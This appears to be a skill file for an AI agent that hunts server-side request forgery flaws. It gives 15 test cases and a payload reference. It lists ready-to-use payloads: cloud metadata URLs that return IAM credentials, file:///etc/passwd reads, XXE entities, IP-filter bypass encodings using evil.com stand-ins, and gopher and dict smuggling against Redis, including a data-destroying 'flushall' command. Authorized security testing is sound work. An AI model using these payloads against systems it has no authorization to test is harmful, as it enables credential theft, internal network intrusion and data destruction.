# SSRF Hunting Skill — 15 Test Cases

> Load when: SSRF, server-side request forgery, cloud metadata, internal network.

## 41. SSRF via URL parameter (easy)
Find every parameter accepting a URL (`?url=`, `?image=`, `?webhook=`, `?callback=`). Replace with `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/`, `http://localhost:22`. Report responses.

## 42. Blind SSRF via webhook (medium)
Point webhooks at Burp Collaborator URL. Note leaked headers (auth, internal hostnames).

## 43. SSRF via PDF generator (hard)
Upload HTML to PDF endpoints with `<iframe src="http://169.254.169.254/...">` or `<img src="file:///etc/passwd">`. wkhtmltopdf and Chromium-based generators often leak.

## 44. SSRF via image proxy (hard)
Submit `http://localhost:6379/` (Redis), `gopher://localhost:6379/_...` to image fetchers. Report any non-image content returned.

## 45. SSRF via DNS rebinding (hard)
Submit `http://rebind.it/<vps-ip>` or set up your own rebinder. Confirm whether validator and fetcher resolve at different times.

## 46. SSRF via redirect chain (medium)
Submit attacker-controlled URL that 302s to `http://169.254.169.254/`. Many fetchers validate the first URL only.

## 47. SSRF via SVG external entities (medium)
Upload SVG referencing `<image href="http://internal-host/">`. Check if rasterizer fetches it.

## 48. SSRF in SAML / OIDC metadata URLs (hard)
If app fetches IdP metadata from user-supplied URL, point it at internal services.

## 49. SSRF via Slack/Discord previews (medium)
Force unfurl/preview service to hit internal services; check returned previews for leaked content.

## 50. SSRF via CSV/XLSX import URLs (medium)
Some importers accept remote URLs. Probe with internal addresses and exotic schemes (`file:`, `ftp:`, `dict:`).

## 51. Bypass IP filter with decimals/hex (medium)
Try `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1/`, `http://127.1/`, `http://[::1]/`, `http://[::ffff:127.0.0.1]/`.

## 52. SSRF to internal admin panels (medium)
Enumerate common internal ports: 80, 443, 8080, 8443, 8500 (Consul), 8080 (Jenkins), 9200 (ES), 5601 (Kibana), 2375 (Docker).

## 53. SSRF via XML external entity (hard)
Send `<!ENTITY xxe SYSTEM "http://internal/">` and observe out-of-band hit.

## 54. SSRF via OAuth redirect_uri (hard)
Some OAuth servers fetch redirect_uri for validation. Try internal addresses.

## 55. SSRF via Kubernetes API (hard)
Target `https://kubernetes.default.svc/api/` and `http://169.254.169.254/` from in-cluster pods.

---

## Cloud Metadata Endpoints
### AWS IMDSv1
`http://169.254.169.254/latest/meta-data/`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

### AWS IMDSv2
PUT `http://169.254.169.254/latest/api/token` → GET with `X-aws-ec2-metadata-token` header

### GCP
`http://metadata.google.internal/computeMetadata/v1/`

### Azure
`http://169.254.169.254/metadata/instance?api-version=2021-02-01`

## Bypass Techniques
| Technique | Payload |
|-----------|---------|
| Double URL encode | `http%253A%252F%252F127.0.0.1` |
| IPv6 | `http://[::1]` |
| IPv4 decimal | `http://2130706433` |
| IPv4 octal | `http://0177.0.0.1` |
| IPv4 hex | `http://0x7f.0.0.1` |
| URL parser confusion | `http://127.0.0.1@evil.com` |
| DNS rebinding | `http://rbndr.us/...` |
| Redirect bypass | Host redirect to `http://127.0.0.1` |
| Enclosed alphanumerics | `http://①②⑦.⓪.⓪.①` |
| Null byte | `http://127.0.0.1%00.evil.com` |

## Protocol Smuggling
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
```
